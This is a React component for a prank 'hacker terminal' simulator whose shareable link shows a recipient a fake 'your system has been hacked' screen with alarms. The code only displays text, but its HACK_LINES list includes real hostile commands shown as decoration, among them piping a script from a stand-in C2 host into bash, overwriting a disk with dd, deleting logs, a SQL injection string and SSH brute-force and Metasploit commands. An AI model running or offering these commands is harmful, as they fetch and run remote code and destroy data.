import { useEffect, useRef, useState, useCallback } from "react";
import { ToolLayout } from "@/components/ToolLayout";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Copy, Check, Link2, Volume2, VolumeX, Maximize, Minimize, Zap, ZapOff } from "lucide-react";

// ─── Hacker terminal lines ───────────────────────────────────────────────────
const HACK_LINES = [
  "> Initializing exploit framework v4.2.0...",
  "> Loading payload modules [██████████] 100%",
  "> Scanning target: 192.168.1.{rand}",
  "> Port scan complete: 22, 80, 443, 8080, 3306 OPEN",
  "> CVE-2024-{rand4} vulnerability detected",
  "> Injecting SQL payload: ' OR 1=1; DROP TABLE users;--",
  "> Bypassing firewall rules... SUCCESS",
  "> Decrypting RSA-4096 private key...",
  "  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] DECRYPTED",
  "> SSH brute-force: admin:{rand6}... FAILED",
  "> SSH brute-force: root:password... FAILED",
  "> SSH brute-force: root:{rand6}... ACCESS GRANTED",
  "> Uploading reverse shell payload (4.2 KB)...",
  "> Shell established on 192.168.1.{rand}:4444",
  "> whoami",
  "  root",
  "> cat /etc/passwd | grep -v nologin",
  "  root:x:0:0:root:/root:/bin/bash",
  "> Extracting password hashes from /etc/shadow...",
  "  $6$salt${rand6}XxYz... [CRACKING]",
  "> Hashcat running at 98.4 GH/s...",
  "> Password cracked: P@ssw0rd{rand4}!",
  "> Pivoting to internal network 10.0.0.0/24...",
  "> ARP spoofing initiated on subnet...",
  "> Intercepting HTTPS traffic (MitM active)...",
  "> Extracting browser cookies from target...",
  "  [session_id] a3f9c2e1d8b7...",
  "  [auth_token] Bearer eyJhbGciOiJS...",
  "> Accessing email account: victim@gmail.com",
  "  Inbox: 2,847 messages downloaded",
  "> Locating stored credentials in keychain...",
  "> Found 23 saved passwords — exporting...",
  "> Wiping forensic traces... [rm -rf /var/log/*]",
  "> Installing persistence: /etc/cron.d/update",
  "> Deploying rootkit to kernel space...",
  "> Keylogger daemon started (PID: {rand4})",
  "> Camera accessed — streaming 720p feed",
  "> Microphone tapped — recording to /tmp/.audio",
  "> GPS coordinates: {gps}",
  "> Exfiltrating {rand}GB of sensitive data...",
  "  Upload speed: 128 MB/s → C2 server",
  "> Encrypting disk with AES-256 ransomware...",
  "  Files encrypted: 47,293 / 47,293 ✓",
  "> Sending ransom note to victim@example.com",
  "> Connecting to Tor network...",
  "  Tor relay: 3 hops established",
  "> Laundering {rand}₿ through mixer...",
  "> Wallet: 1A1zP1eP5QGefi2DMPTfTL...{rand6}",
  "> Deleting bash history... shred -u ~/.bash_history",
  "> Zero-day exploit deployed successfully",
  "> System fully compromised ✓",
  "> Maintaining stealth... CPU usage: 0.1%",
  "python3 -c 'import socket,subprocess,os;s=socket.socket()'",
  "nmap -sS -O -p 1-65535 --script vuln {ip}",
  "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{ip}",
  "msfconsole -q -x 'use exploit/multi/handler'",
  "airmon-ng start wlan0 && airodump-ng wlan0mon",
  "tcpdump -i eth0 -w capture.pcap &",
  "john --wordlist=passwords.txt hash.txt",
  "curl -s https://c2.onion/payload | bash",
  "chmod +x rootkit.sh && ./rootkit.sh --silent",
  "dd if=/dev/urandom of=/dev/sda bs=4M",
  "> ALERT: Intrusion detection system bypassed",
  "> ALERT: 2FA codes intercepted via SS7 attack",
  "> ALERT: Cloud backup deleted from AWS S3",
  "> Data breach complete. Exfiltration: SUCCESS",
];

const MATRIX_CHARS = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF<>{}[]|/\\";

const THEMES = {
  green:  { primary: "#00ff41", dim: "#003b10", bg: "#0a0f0a", glow: "0 0 8px #00ff41, 0 0 20px #00ff41" },
  cyan:   { primary: "#00e5ff", dim: "#00293d", bg: "#080d10", glow: "0 0 8px #00e5ff, 0 0 20px #00e5ff" },
  red:    { primary: "#ff3c3c", dim: "#2a0000", bg: "#0f0505", glow: "0 0 8px #ff3c3c, 0 0 20px #ff3c3c" },
};
type Theme = keyof typeof THEMES;

function rand(n = 999) { return Math.floor(Math.random() * n) + 1; }
function randHex(len = 6) { return [...Array(len)].map(() => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join(""); }

function formatLine(line: string): string {
  return line
    .replace("{rand}", String(rand()))
    .replace("{rand4}", String(rand(9999)).padStart(4, "0"))
    .replace("{rand6}", randHex(6))
    .replace("{ip}", `${rand(255)}.${rand(255)}.${rand(255)}.${rand(255)}`)
    .replace("{gps}", `${(Math.random() * 180 - 90).toFixed(4)}°N ${(Math.random() * 360 - 180).toFixed(4)}°E`);
}

// ─── Web Audio helpers ────────────────────────────────────────────────────────
function createAudioCtx() {
  return new (window.AudioContext || (window as any).webkitAudioContext)();
}
function playBeep(ctx: AudioContext, freq = 440, dur = 0.05, vol = 0.08) {
  const osc = ctx.createOscillator();
  const gain = ctx.createGain();
  osc.connect(gain); gain.connect(ctx.destination);
  osc.frequency.value = freq;
  gain.gain.setValueAtTime(vol, ctx.currentTime);
  gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
  osc.start(); osc.stop(ctx.currentTime + dur);
}
function playAlarm(ctx: AudioContext) {
  [880, 1320, 660, 1100].forEach((f, i) => {
    setTimeout(() => playBeep(ctx, f, 0.2, 0.15), i * 150);
  });
}
function playGranted(ctx: AudioContext) {
  [523, 659, 784, 1047].forEach((f, i) => {
    setTimeout(() => playBeep(ctx, f, 0.18, 0.1), i * 100);
  });
}

// ─── Matrix Rain Canvas ───────────────────────────────────────────────────────
function MatrixCanvas({ theme, active }: { theme: Theme; active: boolean }) {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const colsRef = useRef<number[]>([]);
  const frameRef = useRef<number>(0);

  useEffect(() => {
    const canvas = canvasRef.current!;
    const ctx = canvas.getContext("2d")!;
    const fontSize = 13;

    const resize = () => {
      canvas.width = canvas.offsetWidth;
      canvas.height = canvas.offsetHeight;
      const cols = Math.floor(canvas.width / fontSize);
      colsRef.current = Array(cols).fill(0);
    };
    resize();
    window.addEventListener("resize", resize);

    let last = 0;
    const draw = (ts: number) => {
      frameRef.current = requestAnimationFrame(draw);
      if (!active) return;
      if (ts - last < 55) return;
      last = ts;
      const t = THEMES[theme];
      ctx.fillStyle = `${t.bg}cc`;
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = t.primary;
      ctx.font = `${fontSize}px monospace`;
      colsRef.current.forEach((y, i) => {
        const ch = MATRIX_CHARS[Math.floor(Math.random() * MATRIX_CHARS.length)];
        ctx.fillText(ch, i * fontSize, y * fontSize);
        colsRef.current[i] = y > canvas.height / fontSize && Math.random() > 0.975 ? 0 : y + 1;
      });
    };
    frameRef.current = requestAnimationFrame(draw);
    return () => { cancelAnimationFrame(frameRef.current); window.removeEventListener("resize", resize); };
  }, [theme, active]);

  return <canvas ref={canvasRef} className="absolute inset-0 w-full h-full" style={{ opacity: 0.18 }} />;
}

// ─── Glitch styles (injected once) ───────────────────────────────────────────
const STYLES = `
@keyframes glitch {
  0%   { transform: translate(0); clip-path: inset(0 0 100% 0); }
  10%  { transform: translate(-3px,2px); clip-path: inset(8% 0 72% 0); }
  20%  { transform: translate(3px,-2px); clip-path: inset(40% 0 40% 0); }
  30%  { transform: translate(-2px,1px); clip-path: inset(70% 0 15% 0); }
  40%  { transform: translate(2px,-1px); clip-path: inset(20% 0 65% 0); }
  50%  { transform: translate(0); clip-path: inset(0 0 0 0); }
  100% { transform: translate(0); clip-path: inset(0 0 0 0); }
}
@keyframes glitch2 {
  0%,100%{ transform: translate(0) scaleX(1); opacity:1; }
  10%{ transform: translate(4px,-1px) scaleX(1.02); opacity:.8; }
  20%{ transform: translate(-4px,2px) scaleX(0.98); opacity:.9; }
  30%{ transform: translate(2px,0) skewX(3deg); opacity:1; }
  50%{ transform: translate(-1px,0) skewX(-2deg); }
}
@keyframes scanline {
  0%   { top: -10%; }
  100% { top: 110%; }
}
@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
@keyframes fadeInScale {
  0%   { opacity:0; transform:scale(0.7); }
  100% { opacity:1; transform:scale(1); }
}
@keyframes fadeOut {
  0%   { opacity:1; transform:scale(1); }
  100% { opacity:0; transform:scale(0.8); }
}
@keyframes pulseGreen {
  0%,100%{ box-shadow:0 0 20px #00ff41, 0 0 60px #00ff41; }
  50%{ box-shadow:0 0 40px #00ff41, 0 0 100px #00ff41, inset 0 0 30px #00ff4122; }
}
@keyframes pulseRed {
  0%,100%{ box-shadow:0 0 20px #ff3c3c, 0 0 60px #ff3c3c; }
  50%{ box-shadow:0 0 50px #ff3c3c, 0 0 120px #ff3c3c, inset 0 0 30px #ff3c3c22; background:#1a0000; }
}
@keyframes victimGlitch {
  0%,100%{ transform:translate(0) skewX(0); filter:none; }
  5%{ transform:translate(-6px,2px) skewX(5deg); filter:hue-rotate(90deg); }
  10%{ transform:translate(6px,-2px) skewX(-3deg); filter:brightness(2); }
  15%{ transform:translate(-3px,0) skewX(0); filter:none; }
  85%{ transform:translate(0); filter:none; }
  90%{ transform:translate(4px,1px) skewX(-4deg); filter:hue-rotate(180deg); }
  95%{ transform:translate(-4px,-1px) skewX(2deg); filter:brightness(1.5); }
}
@keyframes hackTitle {
  0%,100%{ opacity:1; text-shadow:0 0 20px #ff3c3c,0 0 40px #ff3c3c; }
  50%{ opacity:0.7; text-shadow:0 0 40px #ff3c3c,0 0 80px #ff3c3c,0 0 120px #ff0000; }
}
.hacker-glitch { animation: glitch 0.4s steps(1) forwards; }
.hacker-glitch2 { animation: glitch2 0.6s linear; }
.blink-cursor { animation: blink 1s step-end infinite; }
.victim-anim { animation: victimGlitch 1.2s infinite; }
`;

// ─── Main Component ───────────────────────────────────────────────────────────
export default function HackerSim() {
  const params = new URLSearchParams(window.location.search);
  const isPrank = params.get("prank") === "true";
  const prankName = params.get("hacker") || "ANONYMOUS";

  if (isPrank) return <VictimView name={prankName} />;
  return <SimulatorView />;
}

// ─── Victim / Prank View ──────────────────────────────────────────────────────
function VictimView({ name }: { name: string }) {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [lines, setLines] = useState<string[]>([]);
  const [glitch, setGlitch] = useState(true);
  const audioRef = useRef<AudioContext | null>(null);
  const termRef = useRef<HTMLDivElement>(null);
  const lineIdx = useRef(0);

  useEffect(() => {
    document.body.style.overflow = "hidden";

    // Audio
    try {
      audioRef.current = createAudioCtx();
      playAlarm(audioRef.current);
      const interval = setInterval(() => {
        if (audioRef.current) playAlarm(audioRef.current);
      }, 3000);
      setTimeout(() => clearInterval(interval), 15000);
    } catch {}

    // Glitch pulse every 3s
    const glitchTimer = setInterval(() => {
      setGlitch(true);
      setTimeout(() => setGlitch(false), 600);
    }, 3000);

    // Stream lines
    const addLine = () => {
      const l = HACK_LINES[lineIdx.current % HACK_LINES.length];
      lineIdx.current++;
      setLines(prev => [...prev.slice(-40), formatLine(l)]);
      if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
    };
    addLine();
    const lineTimer = setInterval(addLine, 400);

    // Matrix canvas
    const canvas = canvasRef.current!;
    const ctx = canvas.getContext("2d")!;
    const fontSize = 14;
    let cols: number[] = [];
    const resizeCanvas = () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      cols = Array(Math.floor(canvas.width / fontSize)).fill(0);
    };
    resizeCanvas();
    window.addEventListener("resize", resizeCanvas);
    let raf: number;
    let lastTs = 0;
    const drawMatrix = (ts: number) => {
      raf = requestAnimationFrame(drawMatrix);
      if (ts - lastTs < 50) return;
      lastTs = ts;
      ctx.fillStyle = "rgba(10,0,0,0.85)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#ff3c3c";
      ctx.font = `${fontSize}px monospace`;
      cols.forEach((y, i) => {
        const ch = MATRIX_CHARS[Math.floor(Math.random() * MATRIX_CHARS.length)];
        ctx.fillText(ch, i * fontSize, y * fontSize);
        cols[i] = y > canvas.height / fontSize && Math.random() > 0.975 ? 0 : y + 1;
      });
    };
    raf = requestAnimationFrame(drawMatrix);

    return () => {
      document.body.style.overflow = "";
      clearInterval(glitchTimer);
      clearInterval(lineTimer);
      cancelAnimationFrame(raf);
      window.removeEventListener("resize", resizeCanvas);
    };
  }, []);

  return (
    <>
      <style>{STYLES}</style>
      <div
        className={glitch ? "victim-anim" : ""}
        style={{
          position: "fixed", inset: 0, zIndex: 99999,
          background: "#0a0000", color: "#ff3c3c",
          fontFamily: "monospace", overflow: "hidden",
        }}
      >
        <canvas ref={canvasRef} style={{ position: "absolute", inset: 0, width: "100%", height: "100%", opacity: 0.25 }} />

        {/* Scanline */}
        <div style={{
          position: "absolute", left: 0, right: 0, height: "3px",
          background: "rgba(255,60,60,0.25)",
          animation: "scanline 4s linear infinite", zIndex: 1, pointerEvents: "none",
        }} />

        {/* CRT vignette */}
        <div style={{
          position: "absolute", inset: 0, zIndex: 1, pointerEvents: "none",
          background: "radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.7) 100%)",
        }} />

        {/* Main content */}
        <div style={{ position: "relative", zIndex: 2, height: "100%", display: "flex", flexDirection: "column", padding: "16px" }}>

          {/* Warning header */}
          <div style={{
            textAlign: "center", padding: "16px 8px",
            borderBottom: "2px solid #ff3c3c",
            animation: "hackTitle 1.5s ease-in-out infinite",
          }}>
            <div style={{ fontSize: "clamp(10px,2.5vw,14px)", letterSpacing: "4px", opacity: 0.7, marginBottom: 4 }}>
              ⚠️ SYSTEM BREACH DETECTED ⚠️
            </div>
            <div style={{
              fontSize: "clamp(18px,5vw,42px)", fontWeight: 900,
              letterSpacing: "2px", lineHeight: 1.2,
              textShadow: "0 0 20px #ff3c3c, 0 0 40px #ff0000",
            }}>
              YOUR SYSTEM HAS BEEN<br />HACKED BY {name.toUpperCase()}
            </div>
            <div style={{ fontSize: "clamp(9px,1.8vw,12px)", opacity: 0.6, marginTop: 6, letterSpacing: "3px" }}>
              ALL YOUR DATA IS BEING EXFILTRATED
            </div>
          </div>

          {/* Terminal */}
          <div ref={termRef} style={{
            flex: 1, overflowY: "auto", padding: "12px 4px",
            fontSize: "clamp(9px,2vw,13px)", lineHeight: 1.6,
          }}>
            {lines.map((l, i) => (
              <div key={i} style={{ opacity: i === lines.length - 1 ? 1 : 0.75 }}>
                {l}
                {i === lines.length - 1 && <span className="blink-cursor" style={{ marginLeft: 2 }}>█</span>}
              </div>
            ))}
          </div>
        </div>

        {/* Watermark */}
        <div style={{
          position: "absolute", bottom: 10, left: "50%", transform: "translateX(-50%)",
          fontSize: 10, opacity: 0.3, letterSpacing: "2px", zIndex: 3, pointerEvents: "none",
          color: "#ff3c3c", fontFamily: "monospace",
        }}>
          Pocket Tools Kit
        </div>
      </div>
    </>
  );
}

// ─── Simulator / Creator View ─────────────────────────────────────────────────
function SimulatorView() {
  const [theme, setTheme] = useState<Theme>("green");
  const [lines, setLines] = useState<string[]>(["> System initialized. Ready to hack...", "> Tap / click anywhere to stream code."]);
  const [modal, setModal] = useState<"granted" | "denied" | null>(null);
  const [modalFading, setModalFading] = useState(false);
  const [autoHack, setAutoHack] = useState(false);
  const [muted, setMuted] = useState(false);
  const [fullscreen, setFullscreen] = useState(false);
  const [hackerName, setHackerName] = useState("");
  const [prank, setPrank] = useState("");
  const [copied, setCopied] = useState(false);
  const [glitching, setGlitching] = useState(false);
  const lineIdx = useRef(0);
  const termRef = useRef<HTMLDivElement>(null);
  const containerRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<AudioContext | null>(null);
  const autoRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastAddRef = useRef(0);

  const t = THEMES[theme];

  const ensureAudio = () => {
    if (!audioRef.current) audioRef.current = createAudioCtx();
    return audioRef.current;
  };

  const addLine = useCallback((burst = false) => {
    const now = Date.now();
    if (!burst && now - lastAddRef.current < 120) return;
    lastAddRef.current = now;
    const l = HACK_LINES[lineIdx.current % HACK_LINES.length];
    lineIdx.current++;
    const formatted = formatLine(l);
    setLines(prev => [...prev.slice(-60), formatted]);
    setTimeout(() => {
      if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
    }, 10);
    if (!muted) {
      try {
        const ctx = ensureAudio();
        playBeep(ctx, 200 + Math.random() * 400, 0.03, 0.04);
      } catch {}
    }
  }, [muted]);

  // Auto-hack toggle
  useEffect(() => {
    if (autoHack) {
      autoRef.current = setInterval(() => addLine(true), 280);
    } else {
      if (autoRef.current) clearInterval(autoRef.current);
    }
    return () => { if (autoRef.current) clearInterval(autoRef.current); };
  }, [autoHack, addLine]);

  // Close modal after delay
  useEffect(() => {
    if (!modal) return;
    const t1 = setTimeout(() => setModalFading(true), 2500);
    const t2 = setTimeout(() => { setModal(null); setModalFading(false); }, 3100);
    return () => { clearTimeout(t1); clearTimeout(t2); };
  }, [modal]);

  const triggerModal = (type: "granted" | "denied") => {
    setGlitching(true);
    setTimeout(() => setGlitching(false), 600);
    setModal(type);
    setModalFading(false);
    if (!muted) {
      try {
        const ctx = ensureAudio();
        if (type === "granted") playGranted(ctx); else playAlarm(ctx);
      } catch {}
    }
    const msg = type === "granted"
      ? "> ✓ ACCESS GRANTED — Welcome to the system."
      : "> ✗ ACCESS DENIED — Invalid credentials. Lockout triggered.";
    setLines(prev => [...prev.slice(-60), msg]);
    setTimeout(() => { if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight; }, 10);
  };

  const generatePrank = () => {
    const name = hackerName.trim() || "ANONYMOUS";
    const base = window.location.origin + import.meta.env.BASE_URL + "tools/hacker";
    setPrank(`${base}?hacker=${encodeURIComponent(name)}&prank=true`);
  };

  const copyPrank = () => {
    if (!prank) return;
    navigator.clipboard.writeText(prank);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const toggleFullscreen = () => {
    if (!fullscreen) {
      containerRef.current?.requestFullscreen?.();
    } else {
      document.exitFullscreen?.();
    }
    setFullscreen(!fullscreen);
  };

  const handleAreaClick = () => { addLine(); ensureAudio(); };

  return (
    <ToolLayout
      toolId="hacker"
      instructions={
        <ul className="list-disc pl-5 space-y-1 text-xs">
          <li><strong>Click / Tap anywhere</strong> on the terminal to stream hacker code.</li>
          <li>Toggle <strong>AUTO HACK</strong> for hands-free streaming.</li>
          <li>Enter a name → <strong>Generate Prank Link</strong> → send to a friend for a fun scare!</li>
          <li>Pick color themes, mute sounds, or go fullscreen for a more dramatic effect.</li>
        </ul>
      }
    >
      <style>{STYLES}</style>

      {/* Controls row */}
      <div className="flex flex-wrap gap-2 mb-3">
        {(["green", "cyan", "red"] as Theme[]).map((th) => (
          <button
            key={th}
            onClick={() => setTheme(th)}
            title={th === "green" ? "Matrix Green" : th === "cyan" ? "Cyber Cyan" : "Danger Red"}
            style={{
              width: 26, height: 26, borderRadius: "50%",
              background: THEMES[th].primary,
              border: theme === th ? "3px solid white" : "3px solid transparent",
              cursor: "pointer", transition: "border 0.2s",
              boxShadow: theme === th ? `0 0 10px ${THEMES[th].primary}` : "none",
            }}
          />
        ))}
        <Button size="sm" variant="outline" onClick={() => setMuted(m => !m)} className="gap-1 h-7 text-xs">
          {muted ? <VolumeX className="h-3 w-3" /> : <Volume2 className="h-3 w-3" />}
          {muted ? "Unmute" : "Mute"}
        </Button>
        <Button size="sm" variant="outline" onClick={toggleFullscreen} className="gap-1 h-7 text-xs">
          {fullscreen ? <Minimize className="h-3 w-3" /> : <Maximize className="h-3 w-3" />}
          Fullscreen
        </Button>
        <Button
          size="sm" onClick={() => { setAutoHack(a => !a); ensureAudio(); }}
          className="gap-1 h-7 text-xs"
          style={{ background: autoHack ? "#ef4444" : undefined }}
        >
          {autoHack ? <ZapOff className="h-3 w-3" /> : <Zap className="h-3 w-3" />}
          {autoHack ? "Stop Auto" : "Auto Hack"}
        </Button>
      </div>

      {/* Terminal */}
      <div
        ref={containerRef}
        className={glitching ? "hacker-glitch2" : ""}
        onClick={handleAreaClick}
        onTouchStart={handleAreaClick}
        style={{
          position: "relative", borderRadius: 12, overflow: "hidden",
          background: t.bg, border: `1.5px solid ${t.primary}`,
          boxShadow: `0 0 18px ${t.primary}44, inset 0 0 30px ${t.dim}`,
          cursor: "crosshair", userSelect: "none",
          minHeight: 320, height: 360,
          transition: "box-shadow 0.3s",
        }}
      >
        <MatrixCanvas theme={theme} active={!autoHack} />

        {/* Scanline */}
        <div style={{
          position: "absolute", left: 0, right: 0, height: "2px",
          background: `${t.primary}20`,
          animation: "scanline 5s linear infinite", zIndex: 1, pointerEvents: "none",
        }} />

        {/* CRT vignette */}
        <div style={{
          position: "absolute", inset: 0, zIndex: 1, pointerEvents: "none",
          background: "radial-gradient(ellipse at center, transparent 55%, rgba(0,0,0,0.55) 100%)",
        }} />

        {/* Terminal title bar */}
        <div style={{
          position: "relative", zIndex: 2, display: "flex", alignItems: "center", gap: 6,
          padding: "8px 14px", borderBottom: `1px solid ${t.primary}44`,
          background: `${t.dim}99`,
        }}>
          {["#ef4444","#f59e0b","#22c55e"].map((c,i)=>(
            <div key={i} style={{ width: 10, height: 10, borderRadius: "50%", background: c }} />
          ))}
          <span style={{ color: t.primary, fontSize: 11, letterSpacing: "2px", marginLeft: 8 }}>
            HACKER TERMINAL v4.2 ● ONLINE
          </span>
        </div>

        {/* Output */}
        <div
          ref={termRef}
          style={{
            position: "relative", zIndex: 2,
            height: "calc(100% - 38px)", overflowY: "auto",
            padding: "10px 14px",
            fontFamily: "monospace", fontSize: 12, lineHeight: 1.7,
            color: t.primary,
          }}
        >
          {lines.map((line, i) => (
            <div
              key={i}
              style={{
                opacity: i === lines.length - 1 ? 1 : 0.72,
                textShadow: i === lines.length - 1 ? t.glow : "none",
              }}
            >
              {line}
              {i === lines.length - 1 && (
                <span className="blink-cursor" style={{ color: t.primary, marginLeft: 2 }}>█</span>
              )}
            </div>
          ))}
        </div>

        {/* Click hint */}
        <div style={{
          position: "absolute", bottom: 10, right: 14, zIndex: 2,
          fontSize: 10, color: t.primary, opacity: 0.35, letterSpacing: "1px", pointerEvents: "none",
        }}>
          TAP TO TYPE
        </div>

        {/* Modal overlay */}
        {modal && (
          <div
            style={{
              position: "absolute", inset: 0, zIndex: 10,
              display: "flex", alignItems: "center", justifyContent: "center",
              background: modal === "granted" ? "rgba(0,30,0,0.85)" : "rgba(30,0,0,0.85)",
              animation: modalFading ? "fadeOut 0.5s ease forwards" : "fadeInScale 0.3s ease",
            }}
          >
            <div style={{
              textAlign: "center", padding: "32px 40px",
              border: `2px solid ${modal === "granted" ? "#00ff41" : "#ff3c3c"}`,
              borderRadius: 16,
              fontFamily: "monospace",
              animation: modal === "granted" ? "pulseGreen 1.5s ease infinite" : "pulseRed 0.8s ease infinite",
            }}>
              <div style={{
                fontSize: 56, lineHeight: 1,
                filter: `drop-shadow(0 0 12px ${modal === "granted" ? "#00ff41" : "#ff3c3c"})`,
              }}>
                {modal === "granted" ? "✓" : "✗"}
              </div>
              <div style={{
                fontSize: 24, fontWeight: 900, letterSpacing: "3px", marginTop: 8,
                color: modal === "granted" ? "#00ff41" : "#ff3c3c",
                textShadow: modal === "granted" ? "0 0 20px #00ff41" : "0 0 20px #ff3c3c",
              }}>
                {modal === "granted" ? "ACCESS GRANTED" : "ACCESS DENIED"}
              </div>
              <div style={{ fontSize: 11, opacity: 0.7, marginTop: 6, letterSpacing: "2px" }}>
                {modal === "granted" ? "AUTHENTICATION SUCCESSFUL" : "LOCKOUT TRIGGERED · ALERT SENT"}
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Access buttons */}
      <div className="flex gap-3 mt-3">
        <button
          onClick={(e) => { e.stopPropagation(); triggerModal("granted"); }}
          style={{
            flex: 1, padding: "10px", borderRadius: 10, border: "1.5px solid #00ff41",
            background: "#001a00", color: "#00ff41", fontFamily: "monospace",
            fontSize: 13, fontWeight: 700, letterSpacing: "2px", cursor: "pointer",
            transition: "box-shadow 0.2s",
          }}
          onMouseEnter={e => (e.currentTarget.style.boxShadow = "0 0 16px #00ff41")}
          onMouseLeave={e => (e.currentTarget.style.boxShadow = "none")}
        >
          ✓ ACCESS GRANTED
        </button>
        <button
          onClick={(e) => { e.stopPropagation(); triggerModal("denied"); }}
          style={{
            flex: 1, padding: "10px", borderRadius: 10, border: "1.5px solid #ff3c3c",
            background: "#1a0000", color: "#ff3c3c", fontFamily: "monospace",
            fontSize: 13, fontWeight: 700, letterSpacing: "2px", cursor: "pointer",
            transition: "box-shadow 0.2s",
          }}
          onMouseEnter={e => (e.currentTarget.style.boxShadow = "0 0 16px #ff3c3c")}
          onMouseLeave={e => (e.currentTarget.style.boxShadow = "none")}
        >
          ✗ ACCESS DENIED
        </button>
      </div>

      {/* Prank link generator */}
      <div className="mt-5 rounded-xl border p-4 space-y-3 bg-muted/30">
        <p className="text-sm font-semibold flex items-center gap-2">
          <Link2 className="h-4 w-4" /> Generate Prank Link
        </p>
        <p className="text-xs text-muted-foreground">
          Enter a name → Generate a shareable link → When your friend opens it, they see the full hacked-screen experience! 😈
        </p>
        <div className="flex gap-2">
          <Input
            placeholder="Enter Hacker Name (e.g. Shadow404)"
            value={hackerName}
            onChange={(e) => setHackerName(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && generatePrank()}
            className="font-mono"
          />
          <Button onClick={generatePrank} className="shrink-0">Generate</Button>
        </div>
        {prank && (
          <div className="space-y-2">
            <div className="flex gap-2">
              <input
                readOnly
                value={prank}
                className="flex-1 font-mono text-xs border rounded-lg px-3 py-2 bg-muted truncate"
              />
              <Button size="sm" variant="outline" onClick={copyPrank} className="gap-1 shrink-0">
                {copied ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
                {copied ? "Copied!" : "Copy"}
              </Button>
            </div>
            <p className="text-xs text-muted-foreground flex items-center gap-1">
              🎭 Share this link via WhatsApp, Telegram, or any chat. The victim sees a full hacker takeover screen!
            </p>
          </div>
        )}
      </div>
    </ToolLayout>
  );
}
